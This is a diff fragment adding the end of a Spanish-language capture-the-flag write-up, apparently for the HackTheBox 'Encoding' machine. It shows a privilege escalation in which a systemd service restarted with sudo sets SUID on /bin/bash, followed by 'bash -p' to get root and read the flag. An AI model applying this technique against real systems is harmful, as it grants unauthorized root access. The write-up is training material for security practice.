+WantedBy=multi-user.target
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al reiniciar el servicio nos ejecuta el comando y la bash es suid, nos convertimos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo systemctl restart privesc
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  6  2022 </span><span class="kd">/bin/bash</span><span class="p">
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# hostname -I
+10.10.11.198 dead:beef::250:56ff:fe96:9f7e 
+bash-5.1# cat /root/root.txt 
+78c**************************978
+bash-5.1#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
